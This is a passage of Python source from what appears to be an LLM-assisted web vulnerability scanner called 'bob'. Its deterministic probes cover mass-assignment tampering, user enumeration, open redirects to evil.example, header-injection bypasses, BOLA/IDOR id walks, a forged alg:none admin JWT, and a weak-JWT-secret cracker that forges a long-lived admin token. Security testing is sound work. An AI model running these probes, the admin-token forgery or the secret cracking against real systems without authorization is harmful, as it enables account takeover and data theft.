    host = (urlparse(base_url).hostname or "").lower()
    targets = []
    for method, u, summary in ops:
        if method != "POST":                          # http-request only does GET/POST (iter10 constraint)
            continue
        # iter19: match on URL substring OR openapi summary/description/tags/operationId - semantic, not path
        low = (u + " " + summary).lower()
        if not any(h in low for h in _BIZ_HINTS):
            continue
        if (urlparse(u).hostname or "").lower() != host:
            continue
        # Substitute path templates like {id} / {orderId} with 1 so the call actually reaches the handler.
        u = re.sub(r"\{[^}]+\}", "1", u)
        targets.append((method, u))
    if not targets:
        return []
    debug_print(f"bob :: biz-logic backstop: {len(targets)} POST/PUT/PATCH endpoints; body-tampering")
    body = json.dumps(_TAMPER_BODY)
    findings = []
    for method, u in targets:
        # http-request only supports GET (no -D) and POST (with -D). No PUT/PATCH. iter10 fix.
        argv = ["http-request", u, "-D", body, "-H", "Content-Type: application/json"]
        raw = _call(argv, headers, debug)
        try:
            env = json.loads(raw)
        except Exception:  # noqa: BLE001
            continue
        data = env.get("data") or []
        if not data or not isinstance(data, list):
            continue
        d = data[0] if isinstance(data[0], dict) else {}
        status = d.get("status")
        body_text = str(d.get("content") or "")[:300]
        if status not in _ACCEPTED_STATUSES:
            continue
        # A 2xx alone is a soft signal; upgrade to High if response echoes any tampered field, otherwise Medium
        low_body = body_text.lower()
        echoed = [k for k in _TAMPER_BODY if k in low_body]
        sev = "high" if echoed else "medium"
        title = ("Mass-assignment / business-logic tamper accepted"
                 f"{' (echoed: ' + ','.join(echoed[:4]) + ')' if echoed else ''}")
        findings.append({
            "severity": sev,
            "title": title,
            "url": u,
            "evidence": f"{method} accepted 2xx with tampered body; sample: {body_text[:80]}",
        })
    return findings


# iter9: user-enumeration backstop --------------------------------------------------------------

_ENUM_PATHS = ("register", "signup", "sign-up", "login", "signin", "sign-in", "forgot", "forgot-password",
               "reset-password", "recover", "otp", "verify-email")


def _extract_urls_any(cache: dict) -> list:
    """Every full URL bob has seen across swagger/crawl/js output - the raw candidate list for the enum probe."""
    urls = set()
    for key, out in cache.items():
        if not key or key[0] not in ("swagger-endpoints", "katana-crawl", "js-endpoints", "path-bust"):
            continue
        try:
            env = json.loads(out)
        except Exception:  # noqa: BLE001
            continue
        data = env.get("data") or []
        if not isinstance(data, list):
            continue
        for d in data:
            if isinstance(d, dict):
                for f in ("url", "endpoint", "path", "href", "fuzzable_url"):
                    v = d.get(f)
                    if isinstance(v, str):
                        urls.add(v)
            elif isinstance(d, str):
                urls.add(d)
    return list(urls)


def _user_enum_backstop(cache: dict, headers: list, base_url: str, debug: bool) -> list:
    """POST a known-good vs a random identifier to any register/login/forgot endpoint bob discovered; if the two
    responses differ materially (status differs, or one says 'exists'/'taken' and the other 'not found'/'invalid'),
    that IS user enumeration. One extra pair of requests per endpoint."""
    urls = _extract_urls_any(cache)
    host = (urlparse(base_url).hostname or "").lower()
    scheme = urlparse(base_url).scheme or "https"
    endpoints = []
    for u in urls:
        if not isinstance(u, str) or not u:
            continue
        if not u.startswith("http"):
            u = f"{scheme}://{host}{u if u.startswith('/') else '/' + u}"
        if (urlparse(u).hostname or "").lower() != host:
            continue
        low = u.lower()
        if not any(h in low for h in _ENUM_PATHS):
            continue
        endpoints.append(re.sub(r"\{[^}]+\}", "1", u))
    endpoints = sorted(set(endpoints))
    if not endpoints:
        return []
    debug_print(f"bob :: user-enum backstop: {len(endpoints)} register/login/forgot endpoints; diff-probing")
    findings = []
    known = {"email": "admin@example.com", "username": "admin", "password": "correcthorsebatterystaple"}
    guess = {"email": "zzq-nosuch-" + "".join(random.choices(string.ascii_lowercase, k=10)) + "@example.com",
             "username": "zzq-" + "".join(random.choices(string.ascii_lowercase, k=10)),
             "password": "wrongwrongwrong"}
    for u in endpoints:
        r1 = _one_json(u, known, headers, debug)
        r2 = _one_json(u, guess, headers, debug)
        if not r1 or not r2:
            continue
        s1, b1 = r1
        s2, b2 = r2
        if s1 == s2 and _enum_body_key(b1) == _enum_body_key(b2):
            continue                                       # both responses identical - no enumeration
        # Materially different -> user enumeration
        findings.append({
            "severity": "medium",
            "title": "User enumeration via differential response",
            "url": u,
            "evidence": f"known: {s1} '{b1[:40]}...' vs guess: {s2} '{b2[:40]}...'",
        })
    return findings


def _one_json(url: str, body: dict, headers: list, debug: bool) -> tuple:
    """POST a JSON body to a url, return (status, body-first-200-chars). http-request is POST when -D given."""
    argv = ["http-request", url, "-D", json.dumps(body), "-H", "Content-Type: application/json"]
    raw = _call(argv, headers, debug)
    try:
        env = json.loads(raw)
    except Exception:  # noqa: BLE001
        return None
    data = env.get("data") or []
    if not data or not isinstance(data[0], dict):
        return None
    d = data[0]
    return int(d.get("status") or 0), str(d.get("content") or "")[:400]


def _enum_body_key(text: str) -> str:
    """A COARSE fingerprint of a response body used to compare two enum probes: strip whitespace + long numbers,
    lowercase, keep the first 200 chars. Two responses matching this fingerprint were 'the same' response."""
    return _NORM_STRIP_INT.sub("N", " ".join(text.split()).lower())[:200]


# iter12: debug-token acquisition ---------------------------------------------------------------
# iter19: no hardcoded well-known-path fallback lists. Discovery (swagger + crawl + path-bust + js-endpoints)
# is what finds candidate endpoints. If an app names its debug endpoint /internal/whodis and it isn't in
# discovery, no hardcoded probe list would find it either - the honest answer is that bob missed discovering it.
_TOKEN_KEYS = ("token", "access_token", "authorization", "auth", "jwt", "bearer", "id_token")


def _acquire_debug_token(cache: dict, base_url: str, debug: bool) -> list:
    """Look for a token in the cached responses to any debug endpoint bob already probed. If a debug endpoint
    returned a body containing `Bearer …` / `token: …` / `access_token: …`, grab it. If nothing in cache, try a
    handful of concrete debug paths (also with `?user=admin`) and take a token from whichever returns one. Returns
    a header list to append (empty if we found nothing). NON-INTRUSIVE - only GET requests. iter14: source-aware
    trust - a token from a DESIGNED debug endpoint (auth-test/whoami/impersonate) may be as short as 2 chars
    (nomnom's `Bearer u3` scheme), but a token from any other URL must be JWT-shaped and ≥16 chars."""
    host = (urlparse(base_url).hostname or "").lower()
    scheme = urlparse(base_url).scheme or "https"
    trusted_hints = ("auth-test", "authtest", "whoami", "impersonate", "auth/token", "debug", "internal")

    def _looks_like_token(v: str, trusted_source: bool) -> bool:
        """A real token is opaque and dense. Trusted source (a designed debug endpoint hands one out): accept from
        len 2 (nomnom's `Bearer u3`). Untrusted source (a spec/config body): require ≥16 chars, JWT-shaped or
        dense. Reject common English/spec placeholder words either way."""
        v = v.strip()
        if len(v) < 2:
            return False
        low = v.lower()
        bad = ("token", "string", "example", "your-token", "your_token", "<token>", "xxx", "yourtoken",
               "bearer", "insert-token", "changeme", "your-key", "example.com", "type", "format",
               "authorization", "api_key", "api-key")
        if any(low == b or low.startswith(b) for b in bad):
            return False
        if trusted_source:
            return True                                # a designed debug endpoint - trust anything short/opaque
        if len(v) < 16:
            return False
        if v.startswith("eyJ"):
            return True
        dense = sum(1 for c in v if c.isalnum() or c in "._-+/=") / max(1, len(v))
        return dense > 0.85

    def _extract(body: str, source_url: str) -> str:
        if not body:
            return ""
        trusted = any(h in source_url.lower() for h in trusted_hints)
        # Skip openapi/swagger bodies for the UNTRUSTED path (they say "Bearer" without holding one).
        low = body[:2000].lower()
        if not trusted and ("openapi" in low or "swagger" in low or "\"paths\"" in low[:1500]):
            return ""
        min_len = 2 if trusted else 16
        # Match `Bearer <tok>` first. Try each match, not just the first.
        for m in re.finditer(rf"[Bb]earer\s+([A-Za-z0-9._~+/=-]{{{min_len},}})", body):
            v = m.group(1)
            if _looks_like_token(v, trusted):
                return v
        # Match `"token"|"access_token"|... : "<value>"`
        for k in _TOKEN_KEYS:
            for m in re.finditer(rf'"{k}"\s*:\s*"([^"]+)"', body, re.I):
                v = m.group(1)
                if _looks_like_token(v, trusted):
                    return v
        return ""

    for key, out in cache.items():
        if not key or key[0] != "http-request":
            continue
        try:
            env = json.loads(out)
        except Exception:  # noqa: BLE001
            continue
        data = env.get("data") or []
        if not data or not isinstance(data[0], dict):
            continue
        body = str(data[0].get("content") or "")
        if len(body) > 20000:
            body = body[:20000]                       # bound cost
        source_url = key[1] if len(key) >= 2 and isinstance(key[1], str) else ""
        tok = _extract(body, source_url)
        if tok:
            debug_print(f"bob :: acquired debug token from {source_url} (len {len(tok)})")
            return [f"Authorization: Bearer {tok}"]

    return []


# iter12: open-redirect deterministic backstop -----------------------------------------------------

_REDIR_PARAMS = ("next", "url", "redirect", "redir", "return", "return_to", "returnto", "returnurl",
                 "dest", "destination", "continue", "callback", "cb", "goto", "target", "back", "success")
_REDIR_EVIL = "https://evil.example"


def _open_redirect_backstop(cache: dict, headers: list, base_url: str, debug: bool) -> list:
    """For every discovered URL with a redirect-shaped query param, send it pointing at evil.example and check
    the Location header. If the server redirects to our host, that IS an open redirect. Cheap: one GET per
    candidate (redirects not followed)."""
    urls = _extract_urls_any(cache)
    host = (urlparse(base_url).hostname or "").lower()
    scheme = urlparse(base_url).scheme or "https"
    seen = set()
    candidates = []
    for u in urls:
        if not isinstance(u, str) or not u:
            continue
        if not u.startswith("http"):
            u = f"{scheme}://{host}{u if u.startswith('/') else '/' + u}"
        p = urlparse(u)
        if (p.hostname or "").lower() != host:
            continue
        keys = [k for k, _ in parse_qsl_local(p.query)]
        matched = [k for k in keys if k.lower() in _REDIR_PARAMS]
        if not matched:
            continue
        for k in matched:
            new_q = "&".join(f"{kk}={_REDIR_EVIL if kk == k else 'x'}" for kk, _ in parse_qsl_local(p.query))
            candidate = f"{p.scheme}://{p.hostname}{p.path}?{new_q}"
            if _norm_url_key(candidate) in seen:
                continue
            seen.add(_norm_url_key(candidate))
            candidates.append((candidate, k))
    if not candidates:
        return []
    debug_print(f"bob :: open-redirect backstop: {len(candidates)} candidates; probing")
    findings = []
    for u, param in candidates:
        raw = _call(["http-request", u], headers, debug)
        try:
            env = json.loads(raw)
        except Exception:  # noqa: BLE001
            continue
        data = env.get("data") or []
        if not data or not isinstance(data[0], dict):
            continue
        d = data[0]
        status = d.get("status") or 0
        # Location may be surfaced under various field names or headers dict
        loc = str(d.get("location") or d.get("Location") or "")
        headers_field = d.get("headers") or {}
        if isinstance(headers_field, dict):
            for hk, hv in headers_field.items():
                if str(hk).lower() == "location":
                    loc = str(hv)
                    break
        if 300 <= int(status) < 400 and ("evil.example" in loc.lower() or loc.strip().startswith("//evil.example")):
            findings.append({
                "severity": "high",
                "title": f"Open redirect via '{param}' param",
                "url": u,
                "evidence": f"status {status}, Location: {loc[:120]}",
            })
    return findings


# iter12: header-mutation deterministic backstop ---------------------------------------------------

_HEADER_TRIALS = (
    ("X-Admin: true", "X-Admin header trust"),
    ("X-Forwarded-For: 127.0.0.1", "X-Forwarded-For trust"),
    ("X-Original-URL: /admin", "X-Original-URL bypass"),
    ("Origin: https://evil.example", "CORS reflected-Origin"),
    ("X-Forwarded-Host: evil.example", "X-Forwarded-Host cache poison"),
    ("Host: evil.example", "Host-header injection"),
)


def _header_mutation_backstop(cache: dict, headers: list, base_url: str, debug: bool) -> list:
    """For each discovered/well-known admin-ish endpoint, try the mutation-header battery: X-Admin, X-Forwarded-
    For, Origin, X-Forwarded-Host, Host. Each takes a single GET; report only when the response CHANGES
    materially from the baseline: 401/403 -> 200 (bypass), or the body reflects the injected host, or CORS
    header reflects the Origin with credentials."""
    host = (urlparse(base_url).hostname or "").lower()
    scheme = urlparse(base_url).scheme or "https"
    # iter19: no well-known-path fallback. Only discovered admin/account/reset/config paths get probed.
    seen_paths = set()
    for u in _extract_urls_any(cache):
        if not isinstance(u, str):
            continue
        try:
            p = urlparse(u if u.startswith("http") else f"{scheme}://{host}{u if u.startswith('/') else '/' + u}")
        except Exception:  # noqa: BLE001
            continue
        if (p.hostname or "").lower() != host:
            continue
        pl = p.path.lower()
        if any(m in pl for m in ("/admin", "/account", "/reset", "/config", "/auth/me", "/password")):
            seen_paths.add(p.path)
    if not seen_paths:
        return []
    debug_print(f"bob :: header-mutation backstop: {len(seen_paths)} paths × {len(_HEADER_TRIALS)} headers")
    findings = []
    for path in sorted(seen_paths):
        u = f"{scheme}://{host}{path}"
        base_raw = _call(["http-request", u], headers, debug)
        try:
            base_env = json.loads(base_raw)
            base_data = (base_env.get("data") or [{}])[0]
        except Exception:  # noqa: BLE001
            continue
        base_status = int(base_data.get("status") or 0)
        base_body = str(base_data.get("content") or "")
        base_len = len(base_body)
        for hdr, label in _HEADER_TRIALS:
            raw = _call(["http-request", u, "-H", hdr], headers, debug)
            try:
                env = json.loads(raw)
                d = (env.get("data") or [{}])[0]
            except Exception:  # noqa: BLE001
                continue
            status = int(d.get("status") or 0)
            body = str(d.get("content") or "")
            hdrs = d.get("headers") or {}
            hdrs_low = {str(k).lower(): str(v) for k, v in hdrs.items()} if isinstance(hdrs, dict) else {}
            # (a) auth bypass: 401/403 -> 200
            if base_status in (401, 403) and status == 200 and len(body) > max(base_len, 30) + 20:
                findings.append({
                    "severity": "high",
                    "title": f"{label}: auth bypass",
                    "url": u,
                    "evidence": f"baseline {base_status} → 200 with '{hdr}'; body {len(body)}B",
                })
                break                                 # one bypass per path is enough
            # (b) CORS with creds reflected
            aco = hdrs_low.get("access-control-allow-origin", "")
            acc = hdrs_low.get("access-control-allow-credentials", "")
            if "evil.example" in aco.lower() and "true" in acc.lower():
                findings.append({
                    "severity": "high",
                    "title": "CORS with credentials on sensitive endpoint",
                    "url": u,
                    "evidence": f"ACAO reflected 'evil.example' + ACAC true",
                })
                continue
            # (c) host-header / cache-poison reflection: our injected 'evil.example' appears in body
            #     (e.g. reset link built from Host header)
            if "evil.example" in body.lower() and "evil.example" not in base_body.lower():
                findings.append({
                    "severity": "high",
                    "title": f"{label}: host reflected in body",
                    "url": u,
                    "evidence": f"'evil.example' reflected in response after '{hdr}'",
                })
                continue
    return findings


# iter16: BOLA walk backstop -----------------------------------------------------------------------

_BOLA_HINTS = ("users", "user", "orders", "order", "invoice", "invoices", "profile", "profiles",
               "accounts", "account", "payments", "payment", "baskets", "basket", "cards", "card",
               "addresses", "address", "notes", "note", "reviews", "review", "messages", "message",
               "documents", "document", "files", "file", "attachments", "attachment", "tickets",
               "ticket", "subscriptions", "subscription", "members", "member", "workspaces",
               "workspace", "projects", "project", "reports", "report", "transactions", "transaction",
               "shipments", "shipment", "bookings", "booking", "reservations", "reservation")


def _bola_walk_backstop(cache: dict, headers: list, base_url: str, debug: bool) -> list:
    """With the acquired token in `headers`, walk id-bearing GET endpoints. For every discovered path whose
    template has `{id}`-shape or already has a numeric segment, fetch it with id ∈ {1,2,3}. If the responses
    differ per id AND the body contains PII-shape signals (email/username/password/address), report BOLA.
    Cheap and precise: one GET per id per endpoint. Skips paths without a body-taking method."""
    if not any("Authorization" in h for h in headers):
        return []                                     # no token -> no meaningful walk
    ops = _iter_swagger_ops(cache, base_url, [], debug)
    scheme = urlparse(base_url).scheme or "https"
    host = (urlparse(base_url).hostname or "").lower()
    seen_paths = set()
    for _, u, _summary in ops:
        try:
            p = urlparse(u)
        except Exception:  # noqa: BLE001
            continue
        if (p.hostname or "").lower() != host:
            continue
        seen_paths.add(p.path)
    # Also grab paths from swagger-endpoints URL strings and crawl
    for u in _extract_urls_any(cache):
        if not isinstance(u, str):
            continue
        try:
            p = urlparse(u if u.startswith("http") else f"{scheme}://{host}{u}")
        except Exception:  # noqa: BLE001
            continue
        if (p.hostname or "").lower() != host:
            continue
        seen_paths.add(p.path)

    # Keep only id-bearing candidates (template `{...}` or a numeric segment).
    candidates = []
    for path in seen_paths:
        if not any(h in path.lower() for h in _BOLA_HINTS):
            continue
        # Templates like /orders/{id} or /users/{uid}/addresses/{aid}
        if re.search(r"\{[^}]+\}", path):
            candidates.append(path)
            continue
        # Numeric-id path like /orders/42
        if re.search(r"/\d+(?:/|$)", path):
            candidates.append(path)
            continue
    if not candidates:
        return []
    debug_print(f"bob :: BOLA walk backstop: {len(candidates)} id-bearing endpoints × 3 ids")
    findings = []
    pii = ("password", "email", "phone", "card", "cvv", "ssn", "address", "birth", "iban", "salary",
           "wallet", "\"role\":", "\"admin\":", "authorization")
    for path in sorted(candidates):
        bodies = {}
        for i in ("1", "2", "3"):
            u_path = re.sub(r"\{[^}]+\}", i, path)    # replace all templates with the id
            u_path = re.sub(r"/\d+(?=/|$)", f"/{i}", u_path)  # or swap numeric segments
            u = f"{scheme}://{host}{u_path}"
            raw = _call(["http-request", u], headers, debug)
            try:
                env = json.loads(raw)
                d = (env.get("data") or [{}])[0]
            except Exception:  # noqa: BLE001
                continue
            status = int(d.get("status") or 0)
            body = str(d.get("content") or "")[:600]
            if status == 200 and body:
                bodies[i] = body
        if len(bodies) < 2:
            continue
        # If bodies differ per id (BOLA), and any contains PII, report.
        distinct = len({hashlib_key(b) for b in bodies.values()})
        if distinct < 2:
            continue
        pii_hit = next((k for k in pii for b in bodies.values() if k in b.lower()), None)
        if not pii_hit:
            continue
        # Normalise the path: {anything} and numeric segments → ":id" so /orders/1, /orders/{oid}, /orders/{FUZZ}
        # all collapse to /orders/:id. That's the real dedup key.
        norm = re.sub(r"\{[^}]+\}", ":id", path)
        norm = re.sub(r"/\d+(?=/|$)", "/:id", norm)
        findings.append({
            "severity": "high",
            "title": f"BOLA/IDOR: {norm} returns other users' data with token walk",
            "url": f"{scheme}://{host}{re.sub(r'{[^}]+}', '1', path)}",
            "evidence": f"3 ids returned {distinct} distinct bodies; contains '{pii_hit}'",
        })
    return findings


# iter17/19: alg:none backstop --------------------------------------------------------------------
# iter19: webhook backstop removed per user - the hardcoded provider bodies (stripe/paypal/razorpay) were
# target-specific and would miss any app using a different provider. Bob's chain-thinking play covers this
# agentically when the LLM sees a webhook-shaped endpoint.

_ALG_NONE_JWT = (
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0."
    "eyJzdWIiOiJhZG1pbiIsInVzZXIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImFkbWluIjp0cnVlLCJpc19hZG1pbiI6dHJ1ZX0."
)

# iter19: broader admin/privileged synonyms - "admin" is one common name; others: management, staff, ops,
# operator, backoffice, back-office, superuser, mgmt, control-panel. Widened to catch novel apps.
_ADMIN_HINTS = ("admin", "console", "internal", "sudo", "root", "backoffice", "back-office", "manage",
                "management", "mgmt", "ops", "operator", "staff", "superuser", "elevated", "control-panel",
                "priv", "privileged", "moderator")


def _alg_none_backstop(cache: dict, headers: list, base_url: str, debug: bool) -> list:
    """Send an alg:none JWT (sub/role/admin=admin, empty signature) to every admin-ish endpoint bob discovered.
    If the request returns a real 200 that wasn't 200 without the token, JWT verification is broken (alg:none
    accepted)."""
    host = (urlparse(base_url).hostname or "").lower()
    scheme = urlparse(base_url).scheme or "https"
    paths = set()
    for u in _extract_urls_any(cache):
        if not isinstance(u, str):
            continue
        try:
            p = urlparse(u if u.startswith("http") else f"{scheme}://{host}{u}")
        except Exception:  # noqa: BLE001
            continue
        if (p.hostname or "").lower() != host:
            continue
        low = p.path.lower()
        if any(h in low for h in _ADMIN_HINTS):
            paths.add(p.path)
    # iter19: also include OpenAPI-metadata-flagged admin paths (a summary or tag saying "admin"/"internal")
    for method, u, summary in _iter_swagger_ops(cache, base_url, headers, debug):
        if any(h in summary for h in _ADMIN_HINTS):
            try:
                p = urlparse(u)
                if (p.hostname or "").lower() == host:
                    paths.add(p.path)
            except Exception:  # noqa: BLE001
                pass
    if not paths:
        return []
    debug_print(f"bob :: alg:none backstop: {len(paths)} admin-ish endpoints")
    findings = []
    forged = f"Authorization: Bearer {_ALG_NONE_JWT}"
    for path in sorted(paths):
        u = f"{scheme}://{host}{re.sub(r'{[^}]+}', '1', path)}"
        base_raw = _call(["http-request", u], headers, debug)
        forge_raw = _call(["http-request", u, "-H", forged], headers, debug)
        try:
            base_env = json.loads(base_raw)
            base_d = (base_env.get("data") or [{}])[0]
            base_status = int(base_d.get("status") or 0)
            base_body = str(base_d.get("content") or "")
            forge_env = json.loads(forge_raw)
            forge_d = (forge_env.get("data") or [{}])[0]
            forge_status = int(forge_d.get("status") or 0)
            forge_body = str(forge_d.get("content") or "")[:400]
        except Exception:  # noqa: BLE001
            continue
        # iter18: widen detection. Fire if either (a) 401/403 -> 200, OR (b) 200 -> 200 with body materially
        # longer / different (an endpoint that returned an empty/error shell to unauth now returns real data).
        auth_bypass = base_status in (401, 403) and forge_status == 200 and len(forge_body) > 30
        body_diff = base_status == 200 and forge_status == 200 and \
            len(forge_body) > max(len(base_body), 100) + 40 and \
            any(k in forge_body.lower() for k in ("email", "role", "admin", "password", "user", "token"))
        if auth_bypass or body_diff:
            findings.append({
                "severity": "high",
                "title": "JWT alg:none accepted on admin endpoint (signature not verified)",
                "url": u,
                "evidence": f"baseline {base_status}({len(base_body)}B) → alg:none {forge_status}({len(forge_body)}B); body: {forge_body[:80]}",
            })
    return findings


# iter18: weak reset-token backstop ----------------------------------------------------------------
# iter19: only discovered endpoints; no hardcoded reset-path fallback.


def _weak_reset_backstop(cache: dict, headers: list, base_url: str, debug: bool) -> list:
    """Call a forgot-password endpoint TWICE with the same email; if the response contains the reset token AND
    the token is the same (or embedded in the body), the token is predictable / handed out in response = weak.
    Also flags a single call whose body returns a reset token (should NEVER echo one back)."""
    host = (urlparse(base_url).hostname or "").lower()
    scheme = urlparse(base_url).scheme or "https"
    seen = set()
    for u in _extract_urls_any(cache):
        if not isinstance(u, str):
            continue
        try:
            p = urlparse(u if u.startswith("http") else f"{scheme}://{host}{u}")
        except Exception:  # noqa: BLE001
            continue
        if (p.hostname or "").lower() != host:
            continue
        if any(h in p.path.lower() for h in ("forgot", "reset-password", "password/reset", "recovery")):
            seen.add(p.path)
    if not seen:
        return []
    debug_print(f"bob :: weak-reset backstop: {len(seen)} forgot/reset endpoints")
    findings = []
    body = json.dumps({"email": "admin@example.com", "username": "admin"})
    for path in sorted(seen):
        u = f"{scheme}://{host}{path}"
        r1 = _call(["http-request", u, "-D", body, "-H", "Content-Type: application/json"], headers, debug)
        r2 = _call(["http-request", u, "-D", body, "-H", "Content-Type: application/json"], headers, debug)
        try:
            b1 = str(((json.loads(r1).get("data") or [{}])[0]).get("content") or "")
            b2 = str(((json.loads(r2).get("data") or [{}])[0]).get("content") or "")
        except Exception:  # noqa: BLE001
            continue
        # a token echoed in the response body is a finding by itself
        for k in ("reset_token", "token", "reset_code"):
            m = re.search(rf'"{k}"\s*:\s*"([^"]{{4,}})"', b1, re.I)
            if m:
                v = m.group(1)
                findings.append({
                    "severity": "high",
                    "title": f"Reset endpoint echoes token in response body ({k})",
                    "url": u,
                    "evidence": f"token {v[:40]}… returned to client (must be sent only via email)",
                })
                # If the same token / a very similar one comes back on a second call, also weak-token
                m2 = re.search(rf'"{k}"\s*:\s*"([^"]+)"', b2, re.I)
                if m2 and (m2.group(1) == v or m2.group(1)[:8] == v[:8]):
                    findings.append({
                        "severity": "high",
                        "title": "Reset token is predictable (same/matching prefix on repeat)",
                        "url": u,
                        "evidence": f"1st: {v[:16]}… 2nd: {m2.group(1)[:16]}… - not cryptographically random",
                    })
                break
    return findings


# iter23: weak-JWT-secret crack -> forge backstop --------------------------------------------------
# Standard tradecraft (jwt_tool / hashcat wordlist), fully agnostic: harvest any HS256 JWT bob captured,
# try to VERIFY it against a wordlist built from common weak secrets + the target's own host labels +
# brand words mined from its pages, crossed with common suffixes. A successful HMAC verification is
# DEFINITIVE - the signing secret is guessable, so any token (incl. an admin one) is forgeable. No
# hardcoded per-target secret: the app that signs with `<its-own-name>-secret` is caught by derivation.

_JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{5,}\.eyJ[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]{10,}")
_COMMON_JWT_SECRETS = ("secret", "jwt_secret", "jwtsecret", "jwt", "changeme", "password", "admin", "key",
                       "private", "secretkey", "supersecret", "s3cr3t", "token", "signingkey", "mysecret",
                       "your-256-bit-secret", "test", "dev", "development", "prod", "production", "letmein")
_JWT_SUFFIXES = ("", "-secret", "_secret", "secret", "-jwt", "_jwt", "-refresh", "_refresh", "-key", "_key",
                 "-token", "-access", "-auth", "123", "!", "2024", "2025")
_JWT_STOP_LABELS = {"www", "appsec", "study", "com", "net", "io", "app", "api", "co", "localhost", "staging",
                    "dev", "test", "prod", "web", "cdn"}


def _b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    try:
        return base64.urlsafe_b64decode(s.encode())
    except Exception:  # noqa: BLE001
        return b""


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _mine_brand_words(cache: dict) -> set:
    """Brand tokens from the app's OWN pages - <title>, og:site_name, CamelCase names - so a secret derived
    from the product name (not the hostname) is still in the wordlist."""
    words: set = set()
    for key, out in cache.items():
        if not key or key[0] != "http-request" or not out:
            continue
        try:
            body = str((((json.loads(out).get("data") or [{}]) or [{}])[0] or {}).get("content") or "")
        except Exception:  # noqa: BLE001
            continue
        if not body:
            continue
        for m in re.finditer(r"<title[^>]*>([^<]{2,60})</title>", body, re.I):
            words.update(re.split(r"[^A-Za-z0-9]+", m.group(1)))
        for m in re.finditer(r'og:site_name"\s+content="([^"]{2,40})"', body, re.I):
            words.update(re.split(r"[^A-Za-z0-9]+", m.group(1)))
        for m in re.finditer(r"\b([A-Z][a-z]+[A-Z][A-Za-z]+)\b", body[:4000]):   # GraphShop, ShopMart
            words.add(m.group(1))
    return {w for w in words if len(w) >= 3}


def _jwt_secret_candidates(base_url: str, cache: dict) -> list:
    roots = set(_COMMON_JWT_SECRETS)
    for lbl in (urlparse(base_url).hostname or "").split("."):
        lbl = lbl.strip().lower()
        if lbl and lbl not in _JWT_STOP_LABELS:
            roots.add(lbl)
    for w in _mine_brand_words(cache):
        w = re.sub(r"[^A-Za-z0-9]", "", w).lower()
        if len(w) >= 3:
            roots.add(w)
    out, seen = [], set()
    for r in roots:
        for suf in _JWT_SUFFIXES:
            c = r + suf
            if c and c not in seen:
                seen.add(c)
                out.append(c)
    return out


def _harvest_jwts(cache: dict) -> list:
    """Every distinct JWT-shaped token bob saw in any tool output (response bodies, Set-Cookie, dumps)."""
    found, seen = [], set()
    for out in cache.values():
        if not out:
            continue
        for m in _JWT_RE.findall(out):
            if m not in seen:
                seen.add(m)
                found.append(m)
    return found


def _jwt_crack(jwt: str, secrets: list) -> str:
    parts = jwt.split(".")
    if len(parts) != 3:
        return ""
    h, p, sig = parts
    try:
        if str(json.loads(_b64url_decode(h)).get("alg", "")).upper() != "HS256":
            return ""
    except Exception:  # noqa: BLE001
        return ""
    signing_input = (h + "." + p).encode()
    want = _b64url_decode(sig)
    if not want:
        return ""
    for s in secrets:
        if hmac.compare_digest(hmac.new(s.encode(), signing_input, hashlib.sha256).digest(), want):
            return s
    return ""


def _jwt_forge_admin(jwt: str, secret: str) -> str:
    h, p, _ = jwt.split(".")
    try:
        payload = json.loads(_b64url_decode(p))
        if not isinstance(payload, dict):
            payload = {}
    except Exception:  # noqa: BLE001
        payload = {}
    # role escalation + a FAR-FUTURE exp so the forged token never expires mid-scan (we control the payload,
    # so no refresh is needed for it) - and clear iat/nbf that could make it not-yet-valid.
    payload.update({"role": "admin", "is_admin": True, "admin": True, "exp": 4102444800, "iat": 1000000000})
    payload.pop("nbf", None)
    new_h = _b64url_encode(b'{"alg":"HS256","typ":"JWT"}')
    new_p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    sig = _b64url_encode(hmac.new(secret.encode(), (new_h + "." + new_p).encode(), hashlib.sha256).digest())
    return f"{new_h}.{new_p}.{sig}"


def _jwt_ttl(jwt: str) -> int:
    """Lifetime (exp-iat, seconds) of a JWT from its payload; 0 if unknown, -1 if no exp (never expires)."""
    try:
        p = json.loads(_b64url_decode(jwt.split(".")[1]))
    except Exception:  # noqa: BLE001
        return 0
    exp, iat = p.get("exp"), p.get("iat")
    if not exp:
        return -1
    return int(exp) - int(iat) if iat else int(exp)


def _jwt_weak_secret_backstop(cache: dict, headers: list, base_url: str, debug: bool) -> list:
    """Crack any captured HS256 JWT against a derived weak-secret wordlist. A verify = the class is proven
    (the secret is guessable, admin tokens are forgeable). One finding; the secret value is NEVER emitted."""
    jwts = _harvest_jwts(cache)
    if not jwts:
        return []
    cands = _jwt_secret_candidates(base_url, cache)
    debug_print(f"bob :: jwt-weak-secret backstop: {len(jwts)} captured JWT(s) vs {len(cands)} candidate secrets")
    findings = []
    # token-lifetime review (single-run): a long-lived or never-expiring ACCESS token is a weak-lifecycle
    # issue and tells the scan how long a harvested token stays usable (predict when it must be re-minted).
    for jwt in jwts[:8]:
        ttl = _jwt_ttl(jwt)
        if ttl == -1:
            findings.append({"severity": "medium", "title": "JWT has no expiry (never-expiring access token)",
                             "url": base_url, "evidence": "captured token has no exp claim - valid forever if leaked"})
            break
        if ttl > 43200:                                   # > 12h access-token lifetime
            findings.append({"severity": "medium", "title": f"Over-long JWT lifetime (~{ttl // 3600}h access token)",
                             "url": base_url, "evidence": f"token TTL {ttl}s - excessive for an access token; widens replay window"})
            break
    for jwt in jwts[:8]:
        secret = _jwt_crack(jwt, cands)
        if not secret:
            continue
        forged = _jwt_forge_admin(jwt, secret)            # forged token gets a far-future exp -> no refresh needed
        debug_print(f"bob :: jwt-weak-secret CRACKED (len {len(secret)}) - admin token forgeable")
        findings.append({
            "severity": "high",
            "title": "Weak JWT signing secret - HS256 token forgeable (admin impersonation)",
            "url": base_url,
            "evidence": f"a captured JWT verifies under a guessable secret [redacted, len {len(secret)}]; "
                        f"admin token forged with a fresh far-future exp {forged[:20]}...",
        })
        break
    return findings


# iter24: deterministic GraphQL exploitation backstop ---------------------------------------------
# When the API is GraphQL, introspection hands us the WHOLE surface - so a deterministic pass can do the
# schema-guided depth the LLM and the light graphql-audit skip: excessive-data (select credential/token
# subfields), BOLA (walk id/code args, seeding real ids from listing queries because ids are often UUIDs),
